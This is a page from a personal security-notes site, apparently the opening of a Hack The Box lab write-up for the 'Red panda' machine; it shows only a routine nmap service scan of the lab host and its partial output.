<!doctype html>
<html class="no-js" lang="en" data-content_root="">
  <head><meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-2TCTE0JE23');
    </script>
        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Sau" href="../sau/sau.html" /><link rel="prev" title="Precious" href="../precious/precious.html" />

    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
        <title>Red panda - blnkn&#39;s notes</title>
      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
    
    


<style>
  body {
    --color-code-background: #f8f8f8;
  --color-code-foreground: black;
  
  }
  @media not print {
    body[data-theme="dark"] {
      --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
    }
    @media (prefers-color-scheme: dark) {
      body:not([data-theme="light"]) {
        --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
      }
    }
  }
</style></head>
  <body>
    
    <script>
      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
    </script>
    

<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
  <symbol id="svg-toc" viewBox="0 0 24 24">
    <title>Contents</title>
    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
    </svg>
  </symbol>
  <symbol id="svg-menu" viewBox="0 0 24 24">
    <title>Menu</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
      <line x1="3" y1="12" x2="21" y2="12"></line>
      <line x1="3" y1="6" x2="21" y2="6"></line>
      <line x1="3" y1="18" x2="21" y2="18"></line>
    </svg>
  </symbol>
  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
    <title>Expand</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
      <polyline points="9 18 15 12 9 6"></polyline>
    </svg>
  </symbol>
  <symbol id="svg-sun" viewBox="0 0 24 24">
    <title>Light mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
      <circle cx="12" cy="12" r="5"></circle>
      <line x1="12" y1="1" x2="12" y2="3"></line>
      <line x1="12" y1="21" x2="12" y2="23"></line>
      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
      <line x1="1" y1="12" x2="3" y2="12"></line>
      <line x1="21" y1="12" x2="23" y2="12"></line>
      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
    </svg>
  </symbol>
  <symbol id="svg-moon" viewBox="0 0 24 24">
    <title>Dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
    </svg>
  </symbol>
  <symbol id="svg-sun-half" viewBox="0 0 24 24">
    <title>Auto light/dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
      <circle cx="12" cy="12" r="9" />
      <path d="M13 12h5" />
      <path d="M13 15h4" />
      <path d="M13 18h1" />
      <path d="M13 9h4" />
      <path d="M13 6h1" />
    </svg>
  </symbol>
</svg>

<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
<label class="overlay sidebar-overlay" for="__navigation">
  <div class="visually-hidden">Hide navigation sidebar</div>
</label>
<label class="overlay toc-overlay" for="__toc">
  <div class="visually-hidden">Hide table of contents sidebar</div>
</label>



<div class="page">
  <header class="mobile-header">
    <div class="header-left">
      <label class="nav-overlay-icon" for="__navigation">
        <div class="visually-hidden">Toggle site navigation sidebar</div>
        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
      </label>
    </div>
    <div class="header-center">
      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
    </div>
    <div class="header-right">
      <div class="theme-toggle-container theme-toggle-header">
        <button class="theme-toggle">
          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
        </button>
      </div>
      <label class="toc-overlay-icon toc-header-icon" for="__toc">
        <div class="visually-hidden">Toggle table of contents sidebar</div>
        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
      </label>
    </div>
  </header>
  <aside class="sidebar-drawer">
    <div class="sidebar-container">
      
      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
  
  <div class="sidebar-logo-container">
    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
  </div>
  
  <span class="sidebar-brand-text">blnkn's notes</span>
  
</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
  <input type="hidden" name="check_keywords" value="yes">
  <input type="hidden" name="area" value="default">
</form>
<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
</ul>
</li>
<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../medium/administrator/administrator.html">Administrator</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/ambassador/ambassador.html">Ambassador</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/authority/authority.html">Authority</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/awkward/awkward.html">Awkward</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/faculty/faculty.html">Faculty</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/forgot/forgot.html">Forgot</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/format/format.html">Format</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/health/health.html">Health</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/jupiter/jupiter.html">Jupiter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/manager/manager.html">Manager</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/mentor/mentor.html">Mentor</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/only4you/only4you.html">Only4you</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/outdated/outdated.html">Outdated</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/sandworm/sandworm.html">Sandworm</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/scrambled/scrambled.html">Scrambled</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/shared/shared.html">Shared</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/thefrizz/thefrizz.html">The Frizz</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/updown/updown.html">Updown</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../medium/zipping/zipping.html">Zipping</a></li>
</ul>
</li>
<li class="toctree-l3 current has-children"><a class="reference internal" href="../easy.html">Easy</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="../analytics/analytics.html">Analytics</a></li>
<li class="toctree-l4"><a class="reference internal" href="../busqueda/busqueda.html">Busqueda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../code/code.html">Code</a></li>
<li class="toctree-l4"><a class="reference internal" href="../codify/codify.html">Codify</a></li>
<li class="toctree-l4"><a class="reference internal" href="../dog/dog.html">Dog</a></li>
<li class="toctree-l4"><a class="reference internal" href="../escapetwo/escapetwo.html">Escape Two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../inject/inject.html">Inject</a></li>
<li class="toctree-l4"><a class="reference internal" href="../keeper/keeper.html">Keeper</a></li>
<li class="toctree-l4"><a class="reference internal" href="../metatwo/metatwo.html">Meta two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../monitorstwo/monitorstwo.html">Monitors two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../pc/pc.html">Pc</a></li>
<li class="toctree-l4"><a class="reference internal" href="../photobomb/photobomb.html">Photobomb</a></li>
<li class="toctree-l4"><a class="reference internal" href="../pilgrimage/pilgrimage.html">Pilgrimage</a></li>
<li class="toctree-l4"><a class="reference internal" href="../precious/precious.html">Precious</a></li>
<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Red panda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../sau/sau.html">Sau</a></li>
<li class="toctree-l4"><a class="reference internal" href="../shoppy/shoppy.html">Shoppy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../soccer/soccer.html">Soccer</a></li>
<li class="toctree-l4"><a class="reference internal" href="../stocker/stocker.html">Stocker</a></li>
<li class="toctree-l4"><a class="reference internal" href="../support/support.html">Support</a></li>
<li class="toctree-l4"><a class="reference internal" href="../topology/topology.html">Topology</a></li>
<li class="toctree-l4"><a class="reference internal" href="../trick/trick.html">Trick</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
</ul>
</li>
</ul>

</div>
</div>

      </div>
      
    </div>
  </aside>
  <div class="main">
    <div class="content">
      <div class="article-container">
        <a href="#" class="back-to-top muted-link">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
          </svg>
          <span>Back to top</span>
        </a>
        <div class="content-icon-container">
          
<div class="theme-toggle-container theme-toggle-content">
            <button class="theme-toggle">
              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
            </button>
          </div>
          <label class="toc-overlay-icon toc-content-icon" for="__toc">
            <div class="visually-hidden">Toggle table of contents sidebar</div>
            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
          </label>
        </div>
        <article role="main">
          <p><img alt="red_panda.png" src="../../../../_images/red_panda.png" /></p>
<section id="red-panda">
<h1>Red panda<a class="headerlink" href="#red-panda" title="Permalink to this heading">#</a></h1>
<section id="enum">
<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>panda.htb<span class="w"> </span>-oN<span class="w"> </span>nmap.initial<span class="w">  </span><span class="m">139</span><span class="w"> </span>⨯
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.92<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2022</span>-10-16<span class="w"> </span><span class="m">13</span>:33<span class="w"> </span>IST
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>panda.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.11.170<span class="o">)</span>
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.037s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">998</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">    </span>VERSION
<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">        </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.5<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssh-hostkey:
<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span><span class="m">48</span>:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span><span class="m">18</span>:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
<span class="m">8080</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-proxy
<span class="p">|</span>_http-open-proxy:<span class="w"> </span>Proxy<span class="w"> </span>might<span class="w"> </span>be<span class="w"> </span>redirecting<span class="w"> </span>requests
<span class="p">|</span>_http-title:<span class="w"> </span>Red<span class="w"> </span>Panda<span class="w"> </span>Search<span class="w"> </span><span class="p">|</span><span class="w"> </span>Made<span class="w"> </span>with<span class="w"> </span>Spring<span class="w"> </span>Boot
<span class="p">|</span><span class="w"> </span>fingerprint-strings:
<span class="p">|</span><span class="w">   </span>GetRequest:
<span class="p">|</span><span class="w">     </span>HTTP/1.1<span class="w"> </span><span class="m">200</span>
<span class="p">|</span><span class="w">     </span>Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
<span class="p">|</span><span class="w">     </span>Content-Language:<span class="w"> </span>en-US
<span class="p">|</span><span class="w">     </span>Date:<span class="w"> </span>Sun,<span class="w"> </span><span class="m">16</span><span class="w"> </span>Oct<span class="w"> </span><span class="m">2022</span><span class="w"> </span><span class="m">12</span>:33:26<span class="w"> </span>GMT
<span class="p">|</span><span class="w">     </span>Connection:<span class="w"> </span>close
<span class="p">|</span><span class="w">     </span>&lt;!DOCTYPE<span class="w"> </span>html&gt;
<span class="p">|</span><span class="w">     </span>&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span><span class="w"> </span><span class="nv">dir</span><span class="o">=</span><span class="s2">&quot;ltr&quot;</span>&gt;
<span class="p">|</span><span class="w">     </span>&lt;head&gt;
<span class="p">|</span><span class="w">     </span>&lt;meta<span class="w"> </span><span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span>&gt;
<span class="p">|</span><span class="w">     </span>&lt;meta<span class="w"> </span><span class="nv">author</span><span class="o">=</span><span class="s2">&quot;wooden_k&quot;</span>&gt;
<span class="p">|</span><span class="w">     </span>&lt;!--Codepen<span class="w"> </span>by<span class="w"> </span>khr2003:<span class="w"> </span>https://codepen.io/khr2003/pen/BGZdXw<span class="w"> </span>--&gt;
<span class="p">|</span><span class="w">     </span>&lt;link<span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span><span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;css/panda.css&quot;</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>&gt;
<span class="p">|</span><span class="w">     </span>&lt;link<span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span><span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;css/main.css&quot;</span><span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>&gt;
<span class="p">|</span><span class="w">     </span>&lt;title&gt;Red<span class="w"> </span>Panda<span class="w"> </span>Search<span class="w"> </span><span class="p">|</span><span class="w"> </span>Made<span class="w"> </span>with<span class="w"> </span>Spring<span class="w"> </span>Boot&lt;/title&gt;
<span class="p">|</span><span class="w">     </span>&lt;/head&gt;
<span class="p">|</span><span class="w">     </span>&lt;body&gt;
<span class="p">|</span><span class="w">     </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s1">&#39;pande&#39;</span>&gt;
<span class="p">|</span><span class="w">     </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s1">&#39;ear left&#39;</span>&gt;&lt;/div&gt;
<span class="p">|</span><span class="w">     </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s1">&#39;ear right&#39;</span>&gt;&lt;/div&gt;
<span class="p">|</span><span class="w">     </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s1">&#39;whiskers left&#39;</span>&gt;
<span class="p">|</span><span class="w">     </span>&lt;span&gt;&lt;/span&gt;
<span class="p">|</span><span class="w">     </span>&lt;span&gt;&lt;/span&gt;
<span class="p">|</span><span class="w">     </span>&lt;span&gt;&lt;/span&gt;
<span class="p">|</span><span class="w">     </span>&lt;/div&gt;
<span class="p">|</span><span class="w">     </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s1">&#39;whiskers right&#39;</span>&gt;
<span class="p">|</span><span class="w">     </span>&lt;span&gt;&lt;/span&gt;
<span class="p">|</span><span class="w">     </span>&lt;span&gt;&lt;/span&gt;
<span class="p">|</span><span class="w">     </span>&lt;span&gt;&lt;/span&gt;
<span class="p">|</span><span class="w">     </span>&lt;/div&gt;
<span class="p">|</span><span class="w">     </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s1">&#39;face&#39;</span>&gt;
<span class="p">|</span><span class="w">     </span>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s1">&#39;eye</span>
<span class="s1">|   HTTPOptions:</span>
<span class="s1">|     HTTP/1.1 200</span>
<span class="s1">|     Allow: GET,HEAD,OPTIONS</span>
<span class="s1">|     Content-Length: 0</span>
<span class="s1">|     Date: Sun, 16 Oct 2022 12:33:26 GMT</span>
<span class="s1">|     Connection: close</span>
<span class="s1">|   RTSPRequest:</span>
<span class="s1">|     HTTP/1.1 400</span>
<span class="s1">|     Content-Type: text/html;charset=utf-8</span>
<span class="s1">|     Content-Language: en</span>
<span class="s1">|     Content-Length: 435</span>
<span class="s1">|     Date: Sun, 16 Oct 2022 12:33:26 GMT</span>
<span class="s1">|     Connection: close</span>
